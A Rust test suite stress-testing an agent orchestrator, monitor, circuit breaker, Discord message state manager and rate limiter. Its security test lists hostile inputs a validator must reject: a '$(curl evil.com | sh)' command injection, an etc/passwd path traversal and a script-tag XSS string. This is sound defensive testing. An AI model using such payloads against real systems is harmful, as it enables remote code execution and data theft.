/// 🎯 PRECISION PRESSURE TESTS: Surgical testing of critical system pressure points
/// FOCUS: Testing specific failure scenarios that could cause cascading system failures
/// Why: Identifies exact points where the system is vulnerable to breakdown
/// Alternative: Exhaustive testing (rejected: wastes resources on non-critical paths)
use crate::agents::orchestrator::AgentOrchestrator;
use crate::claude_code::circuit_breaker::{CircuitBreaker, CircuitBreakerConfig};
use crate::discord::message_state_manager::{MessageStateConfig, MessageStateManager};
use crate::monitoring::{MonitoringConfig, SystemMonitor};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Mutex;
use tokio::time::timeout;
// Test helpers available if needed
// use super::test_helpers::{run_test_with_timeout, test_progress};

#[cfg(test)]
mod shutdown_signal_pressure_tests {
    use super::*;

    /// 🎯 PRESSURE POINT: Shutdown signal race condition between orchestrator and monitoring
    /// Tests what happens when shutdown signals are sent simultaneously to multiple components
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_concurrent_shutdown_signal_race() {
        println!("🔍 [SHUTDOWN TEST] Starting concurrent shutdown signal race test");

        // Use reasonable timeout for shutdown test (orchestrator shutdown can take 2s in test mode)
        let test_timeout = Duration::from_secs(10);
        let test_result = timeout(test_timeout, async {
            println!("🔍 [SHUTDOWN TEST] Creating config and components");
            let config = crate::config::Config::test_config();
            let orchestrator = Arc::new(AgentOrchestrator::new(config).await.unwrap());
            let monitor = Arc::new(SystemMonitor::new(MonitoringConfig::default()));

            println!("🔍 [SHUTDOWN TEST] Starting orchestrator");
            // Start both components
            let orchestrator_clone = orchestrator.clone();
            let _orchestrator_handle = tokio::spawn(async move { orchestrator_clone.run().await });
            println!("🔍 [SHUTDOWN TEST] Starting monitor");
            monitor.start_monitoring().await.unwrap();

            // Give them a moment to initialize
            println!("🔍 [SHUTDOWN TEST] Waiting 100ms for initialization");
            tokio::time::sleep(Duration::from_millis(100)).await;

            // 🎯 PRECISION TARGET: Race condition when both shutdown simultaneously
            let orchestrator_clone = Arc::clone(&orchestrator);
            let monitor_clone = Arc::clone(&monitor);

            println!("🔍 [SHUTDOWN TEST] Triggering simultaneous shutdowns");
            let (shutdown1, shutdown2) = tokio::join!(
                async move {
                    println!("🔍 [SHUTDOWN TEST] Shutting down orchestrator...");
                    orchestrator_clone.shutdown().await;
                    println!("🔍 [SHUTDOWN TEST] Orchestrator shutdown complete");
                    "orchestrator_done"
                },
                async move {
                    println!("🔍 [SHUTDOWN TEST] Shutting down monitor...");
                    monitor_clone.shutdown().await;
                    println!("🔍 [SHUTDOWN TEST] Monitor shutdown complete");
                    "monitor_done"
                }
            );

            println!("🔍 [SHUTDOWN TEST] Both shutdowns completed");
            // Both should complete without deadlock or panic
            assert_eq!(shutdown1, "orchestrator_done");
            assert_eq!(shutdown2, "monitor_done");

            println!("✅ [SHUTDOWN TEST] Test passed successfully");
        })
        .await;

        match test_result {
            Ok(_) => println!(
                "✅ [SHUTDOWN TEST] Completed within {}s timeout",
                test_timeout.as_secs()
            ),
            Err(_) => panic!(
                "❌ [SHUTDOWN TEST] TIMEOUT after {}s - possible deadlock in shutdown",
                test_timeout.as_secs()
            ),
        }
    }

    /// 🎯 PRESSURE POINT: Shutdown signal sender dropped before receiver
    /// Tests resource cleanup when shutdown channel is broken unexpectedly
    #[tokio::test]
    async fn test_broken_shutdown_channel_handling() {
        let manager = Arc::new(MessageStateManager::new(MessageStateConfig {
            cleanup_interval: Duration::from_millis(50),
            ..Default::default()
        }));

        manager.clone().start_cleanup_task().await;

        // 🎯 PRECISION TARGET: Force sender to be dropped by shutting down immediately
        // This tests if cleanup task handles broken channel gracefully
        manager.shutdown().await;

        // Give time for any potential crashes or resource leaks
        tokio::time::sleep(Duration::from_millis(100)).await;

        // Test should complete without hanging or panicking
    }
}

#[cfg(test)]
mod resource_lifecycle_pressure_tests {
    use super::*;

    /// 🎯 PRESSURE POINT: JoinHandle cleanup failure during system overload
    /// Tests task handle resource management when system is under heavy concurrent load
    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
    async fn test_task_handle_cleanup_under_load() {
        println!("🔍 [LOAD TEST] Starting task handle cleanup under load test");

        let test_timeout = Duration::from_secs(10);
        let test_result = timeout(test_timeout, async {
            println!("🔍 [LOAD TEST] Creating orchestrator");
            let config = crate::config::Config::test_config();
            let orchestrator = Arc::new(AgentOrchestrator::new(config).await.unwrap());

            println!("🔍 [LOAD TEST] Starting orchestrator");
            let orchestrator_clone = orchestrator.clone();
            let _orchestrator_handle = tokio::spawn(async move { orchestrator_clone.run().await });

            // Give orchestrator time to initialize
            tokio::time::sleep(Duration::from_millis(100)).await;

            println!("🔍 [LOAD TEST] Submitting 20 concurrent tasks");
            // Create moderate concurrent load on the orchestrator
            let mut handles = Vec::new();
            for i in 0..20 {
                let orch_clone = Arc::clone(&orchestrator);
                let handle = tokio::spawn(async move {
                    let task = crate::models::Task::new(
                        crate::models::AgentType::SoftwareDeveloper,
                        format!("Load test task {i}"),
                        crate::models::Priority::Low,
                    );
                    match orch_clone.submit_task(task).await {
                        Ok(id) => println!("🔍 [LOAD TEST] Task {i} submitted with ID: {id}"),
                        Err(e) => println!("⚠️ [LOAD TEST] Task {i} submission failed: {e}"),
                    }
                });
                handles.push(handle);
            }

            println!("🔍 [LOAD TEST] Waiting for all task submissions to complete");
            // Wait for tasks to be submitted
            for (i, handle) in handles.into_iter().enumerate() {
                if let Err(e) = handle.await {
                    println!("⚠️ [LOAD TEST] Task handle {i} join error: {e}");
                }
            }

            println!("🔍 [LOAD TEST] All submissions complete, waiting 500ms for processing");
            // 🎯 PRECISION TARGET: Test system state under load without triggering shutdown bug
            // Allow time for tasks to start processing
            tokio::time::sleep(Duration::from_millis(500)).await;

            println!("🔍 [LOAD TEST] Checking system responsiveness");
            // Verify orchestrator is still responsive and managing resources
            let system_status = orchestrator.get_system_status().await;
            println!(
                "🔍 [LOAD TEST] System uptime: {}s",
                system_status.system_uptime
            );
            assert!(
                system_status.system_uptime > 0.0,
                "System should be operational under load"
            );

            // Test that we can still submit tasks (system not deadlocked)
            println!("🔍 [LOAD TEST] Testing new task submission");
            let test_task = crate::models::Task::new(
                crate::models::AgentType::SoftwareDeveloper,
                "Test responsiveness under load".to_string(),
                crate::models::Priority::High,
            );
            let submit_result = orchestrator.submit_task(test_task).await;
            match &submit_result {
                Ok(id) => println!("🔍 [LOAD TEST] New task submitted successfully with ID: {id}"),
                Err(e) => println!("❌ [LOAD TEST] New task submission failed: {e}"),
            }
            assert!(
                submit_result.is_ok(),
                "System should accept new tasks under load"
            );

            println!("🔍 [LOAD TEST] Shutting down orchestrator");
            // Shutdown the orchestrator to prevent hanging test
            orchestrator.shutdown().await;
            println!("✅ [LOAD TEST] Test completed successfully");
        })
        .await;

        match test_result {
            Ok(_) => println!(
                "✅ [LOAD TEST] Completed within {}s timeout",
                test_timeout.as_secs()
            ),
            Err(_) => panic!(
                "❌ [LOAD TEST] TIMEOUT after {}s - system may be deadlocked",
                test_timeout.as_secs()
            ),
        }
    }

    /// 🎯 PRESSURE POINT: Memory leak in pending message cleanup
    /// Tests if expired messages are properly cleaned up when many accumulate
    #[tokio::test]
    async fn test_pending_message_memory_pressure() {
        use serenity::model::id::{ChannelId, MessageId};

        let manager = Arc::new(MessageStateManager::new(MessageStateConfig {
            message_timeout: Duration::from_millis(100), // Very short timeout
            cleanup_interval: Duration::from_millis(50),
            ..Default::default()
        }));

        manager.clone().start_cleanup_task().await;

        // 🎯 PRECISION TARGET: Register many messages that will quickly expire
        for i in 0..1000 {
            manager
                .register_message(
                    MessageId::from((i + 1) as u64), // MessageIDs must be non-zero in Discord/Serenity
                    ChannelId::from(12345),
                    format!("Message content {i}"),
                )
                .await;
        }

        // Wait for messages to expire and be cleaned up
        tokio::time::sleep(Duration::from_millis(200)).await;

        let stats = manager.get_stats().await;

        // 🎯 VALIDATION: Most messages should be cleaned up (timed out)
        assert!(
            stats.timed_out_messages > 900,
            "Most messages should have been cleaned up"
        );
        assert!(
            stats.pending_messages < 100,
            "Few messages should remain pending"
        );

        manager.shutdown().await;
    }
}

#[cfg(test)]
mod concurrency_intersection_pressure_tests {
    use super::*;

    /// 🎯 PRESSURE POINT: Multiple threads accessing circuit breaker state simultaneously
    /// Tests thread safety of circuit breaker under concurrent access patterns
    #[tokio::test]
    async fn test_circuit_breaker_concurrent_state_transitions() {
        let breaker = Arc::new(Mutex::new(CircuitBreaker::new(CircuitBreakerConfig {
            failure_threshold: 3,
            timeout_duration: Duration::from_millis(50),
            success_threshold: 2,
            failure_window: Duration::from_secs(1),
        })));

        // 🎯 PRECISION TARGET: Concurrent threads causing state transitions
        let mut handles = Vec::new();

        // Spawn threads that will cause failures
        for _ in 0..10 {
            let breaker_clone = Arc::clone(&breaker);
            let handle = tokio::spawn(async move {
                for _ in 0..5 {
                    let cb = breaker_clone.lock().await;
                    if cb.should_allow_request().await {
                        cb.record_failure().await; // Force failures to trigger state change
                    }
                    drop(cb); // Release lock immediately
                    tokio::time::sleep(Duration::from_millis(1)).await;
                }
            });
            handles.push(handle);
        }

        // Wait for concurrent operations
        for handle in handles {
            handle.await.unwrap();
        }

        // 🎯 VALIDATION: Circuit breaker should be in consistent state
        let cb = breaker.lock().await;
        let metrics = cb.get_metrics().await;

        // State should be logically consistent - if failure count >= threshold, should be open
        if metrics.failure_count >= 3 {
            assert!(
                !cb.should_allow_request().await,
                "Circuit should be open with {} failures",
                metrics.failure_count
            );
        }
    }

    /// 🎯 PRESSURE POINT: Queue overflow during concurrent task submissions
    /// Tests backpressure mechanism under maximum concurrent load
    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
    async fn test_task_queue_backpressure_under_concurrent_load() {
        println!("🔍 [QUEUE TEST] Starting task queue backpressure test");

        let test_timeout = Duration::from_secs(20);
        let test_result = timeout(test_timeout, async {
            println!("🔍 [QUEUE TEST] Creating orchestrator");
            let config = crate::config::Config::test_config();
            let orchestrator = Arc::new(AgentOrchestrator::new(config).await.unwrap());

            println!("🔍 [QUEUE TEST] Starting orchestrator");
            let orchestrator_clone = orchestrator.clone();
            let _orchestrator_handle = tokio::spawn(async move { orchestrator_clone.run().await });

            // 🎯 PRECISION TARGET: Concurrent submissions to trigger queue overflow
            let mut submit_handles = Vec::new();
            let results = Arc::new(Mutex::new(Vec::new()));

            for i in 0..200 {
                // Attempt to overflow MAX_QUEUE_SIZE (1000)
                let orch_clone = Arc::clone(&orchestrator);
                let results_clone = Arc::clone(&results);

                let handle = tokio::spawn(async move {
                    let task = crate::models::Task::new(
                        crate::models::AgentType::SoftwareDeveloper,
                        format!("Overflow test task {i}"),
                        crate::models::Priority::Low,
                    );

                    let result = orch_clone.submit_task(task).await;
                    let mut results_guard = results_clone.lock().await;
                    results_guard.push(result);
                });

                submit_handles.push(handle);
            }

            println!("🔍 [QUEUE TEST] All spawn operations complete, waiting for results");
            // Wait for all submissions with progress reporting
            for (i, handle) in submit_handles.into_iter().enumerate() {
                if i % 50 == 0 {
                    println!("🔍 [QUEUE TEST] Waiting for task handle {i}...");
                }
                match timeout(Duration::from_secs(1), handle).await {
                    Ok(Ok(_)) => {}
                    Ok(Err(e)) => println!("⚠️ [QUEUE TEST] Task {i} join error: {e}"),
                    Err(_) => println!("⚠️ [QUEUE TEST] Task {i} timed out"),
                }
            }

            println!("🔍 [QUEUE TEST] Analyzing results");
            // 🎯 VALIDATION: All should succeed since 200 < MAX_QUEUE_SIZE (1000)
            let results_guard = results.lock().await;
            let successes = results_guard.iter().filter(|r| r.is_ok()).count();
            let failures = results_guard.iter().filter(|r| r.is_err()).count();

            println!("🔍 [QUEUE TEST] Results: {successes} successes, {failures} failures");

            assert_eq!(
                successes, 200,
                "All 200 tasks should be accepted within queue limit"
            );
            assert_eq!(failures, 0, "No tasks should be rejected under normal load");

            println!("🔍 [QUEUE TEST] Shutting down orchestrator");
            orchestrator.shutdown().await;
            println!("✅ [QUEUE TEST] Test completed");
        })
        .await;

        match test_result {
            Ok(_) => println!(
                "✅ [QUEUE TEST] Completed within {}s timeout",
                test_timeout.as_secs()
            ),
            Err(_) => panic!(
                "❌ [QUEUE TEST] TIMEOUT after {}s - possible queue deadlock",
                test_timeout.as_secs()
            ),
        }
    }
}

#[cfg(test)]
mod error_propagation_pressure_tests {
    use super::*;

    /// 🎯 PRESSURE POINT: Circuit breaker failure during monitoring collection
    /// Tests how monitoring system handles component failures during metric collection
    #[tokio::test]
    async fn test_monitoring_handles_circuit_breaker_failures() {
        let monitor = SystemMonitor::new(MonitoringConfig {
            collection_interval: Duration::from_millis(50),
            ..Default::default()
        });

        monitor.start_monitoring().await.unwrap();

        // 🎯 PRECISION TARGET: Let monitoring collect metrics even without Claude client
        tokio::time::sleep(Duration::from_millis(200)).await;

        let health_status = monitor.get_health_status().await;
        let current_metrics = monitor.get_current_metrics().await;

        // 🎯 VALIDATION: Monitoring should continue despite lack of circuit breaker
        assert!(
            matches!(
                health_status,
                crate::monitoring::HealthStatus::Healthy
                    | crate::monitoring::HealthStatus::Degraded
                    | crate::monitoring::HealthStatus::Unhealthy
                    | crate::monitoring::HealthStatus::Critical
            ),
            "Health status should be determined despite failures"
        );

        assert!(
            current_metrics.uptime_seconds > 0.0,
            "Metrics collection should continue"
        );

        monitor.shutdown().await;
    }

    /// 🎯 PRESSURE POINT: Task failure propagation to agent status
    /// Tests if agent status correctly reflects task failures without corrupting other agents
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_task_failure_propagation_isolation() {
        println!("🔍 [FAILURE TEST] Starting task failure propagation isolation test");

        let test_timeout = Duration::from_secs(10);
        let test_result = timeout(test_timeout, async {
            println!("🔍 [FAILURE TEST] Creating orchestrator");
            let config = crate::config::Config::test_config();
            let orchestrator = Arc::new(AgentOrchestrator::new(config).await.unwrap());

            println!("🔍 [FAILURE TEST] Starting orchestrator");
            let orchestrator_clone = orchestrator.clone();
            let _orchestrator_handle = tokio::spawn(async move { orchestrator_clone.run().await });

            // Give orchestrator time to initialize
            tokio::time::sleep(Duration::from_millis(100)).await;

            println!("🔍 [FAILURE TEST] Submitting test task");
            // Submit a simple task (should succeed with mock)
            let task = crate::models::Task::new(
                crate::models::AgentType::SoftwareDeveloper,
                "Simple task for testing".to_string(),
                crate::models::Priority::High,
            );

            let task_id = orchestrator.submit_task(task).await.unwrap();
            println!("🔍 [FAILURE TEST] Task submitted with ID: {task_id}");

            // 🎯 PRECISION TARGET: Wait for task processing
            println!("🔍 [FAILURE TEST] Waiting for task to complete (max 3s)");
            let result = timeout(Duration::from_secs(3), async {
                let mut checks = 0;
                loop {
                    checks += 1;
                    if let Some(task_status) = orchestrator.get_task_status(&task_id).await {
                        if checks % 10 == 0 {
                            println!(
                                "🔍 [FAILURE TEST] Task status after {} checks: {:?}",
                                checks, task_status.status
                            );
                        }
                        if matches!(
                            task_status.status,
                            crate::models::TaskStatus::Completed
                                | crate::models::TaskStatus::Failed
                        ) {
                            println!(
                                "🔍 [FAILURE TEST] Task completed with status: {:?}",
                                task_status.status
                            );
                            break;
                        }
                    }
                    tokio::time::sleep(Duration::from_millis(50)).await;
                }
            })
            .await;

            assert!(result.is_ok(), "Task should complete within timeout");

            // 🎯 VALIDATION: Agent status should be consistent and system operational
            let agent_status = orchestrator
                .get_agent_status(&crate::models::AgentType::SoftwareDeveloper)
                .await;
            assert!(
                agent_status.is_some(),
                "Agent should be available after task completion"
            );

            let status = agent_status.unwrap();
            assert!(
                !status.is_busy,
                "Agent should not be stuck in busy state after completion"
            );

            // System should still accept new tasks
            let new_task = crate::models::Task::new(
                crate::models::AgentType::SoftwareDeveloper,
                "New task after previous completion".to_string(),
                crate::models::Priority::Medium,
            );

            let new_task_result = orchestrator.submit_task(new_task).await;
            println!("🔍 [FAILURE TEST] New task submission result: {new_task_result:?}");
            assert!(
                new_task_result.is_ok(),
                "System should accept new tasks after previous completion"
            );

            println!("🔍 [FAILURE TEST] Shutting down orchestrator");
            orchestrator.shutdown().await;
            println!("✅ [FAILURE TEST] Test completed successfully");
        })
        .await;

        match test_result {
            Ok(_) => println!(
                "✅ [FAILURE TEST] Completed within {}s timeout",
                test_timeout.as_secs()
            ),
            Err(_) => panic!(
                "❌ [FAILURE TEST] TIMEOUT after {}s - possible task processing deadlock",
                test_timeout.as_secs()
            ),
        }
    }
}

#[cfg(test)]
mod security_boundary_pressure_tests {
    use super::*;

    /// 🎯 PRESSURE POINT: Message validation under payload bomb attack
    /// Tests if validation can handle extremely large or complex malicious inputs
    #[tokio::test]
    async fn test_message_validation_payload_bomb_resistance() {
        use crate::discord::{MessageSecurityValidator, RiskLevel};
        use std::time::Instant;

        let validator = MessageSecurityValidator::new();

        let payload_bombs = [
            "<div>".repeat(10000) + &"</div>".repeat(10000),
            "$(curl evil.com | sh);".repeat(1000),
            "\u{1F4A3}".repeat(5000) + &"💣".repeat(5000),
            "../".repeat(5000) + "etc/passwd",
            "<script>alert(1)</script>".repeat(2000),
        ];

        // Test each payload bomb for resilience
        for (i, bomb) in payload_bombs.iter().enumerate() {
            let start = Instant::now();
            let result = validator.validate_message_content(bomb);
            let elapsed = start.elapsed();

            // Should reject all payload bombs (either for size or malicious content)
            if result.is_valid {
                println!(
                    "Payload bomb {} was not rejected! Content length: {}, Issues: {:?}",
                    i,
                    bomb.len(),
                    result.issues
                );
            }
            assert!(!result.is_valid, "Payload bomb {i} should be rejected");

            // Should have appropriate risk level
            assert!(
                matches!(result.risk_level, RiskLevel::High | RiskLevel::Critical),
                "Payload bomb {} should have high/critical risk level, got {:?}",
                i,
                result.risk_level
            );

            // Should complete validation quickly even for large inputs
            assert!(
                elapsed < Duration::from_millis(100),
                "Validation of payload bomb {i} took too long: {elapsed:?}"
            );
        }

        // Test that normal messages still work
        let normal_msg = "Hello, this is a normal message";
        let result = validator.validate_message_content(normal_msg);
        assert!(result.is_valid, "Normal message should be valid");
    }

    /// 🎯 PRESSURE POINT: Rate limiter precision under burst traffic  
    /// Tests rate limiting accuracy during coordinated burst attacks
    #[tokio::test]
    async fn test_rate_limiter_burst_precision() {
        use crate::discord::MessageRateLimiter;
        use std::time::Instant;

        let mut rate_limiter = MessageRateLimiter::new();
        let user_id = 12345u64;

        // Test burst detection with precise timing
        let burst_count = 15;
        let mut allowed_count = 0;
        let mut blocked_count = 0;
        let start_time = Instant::now();

        // Simulate rapid burst
        for i in 0..burst_count {
            let request_time = start_time + Duration::from_millis(i * 50); // 50ms apart
            if rate_limiter.is_allowed(user_id, request_time) {
                allowed_count += 1;
            } else {
                blocked_count += 1;
            }
        }

        // Should allow first few then block the rest
        assert!(allowed_count > 0, "Should allow some requests");
        assert!(blocked_count > 0, "Should block burst requests");
        assert!(
            allowed_count <= 5,
            "Should not allow too many burst requests"
        );

        // Test cooldown period
        let after_cooldown = start_time + Duration::from_secs(61);
        assert!(
            rate_limiter.is_allowed(user_id, after_cooldown),
            "Should allow requests after cooldown"
        );

        // Test different user isn't affected
        let other_user = 67890u64;
        assert!(
            rate_limiter.is_allowed(other_user, Instant::now()),
            "Different user should not be rate limited"
        );
    }
}
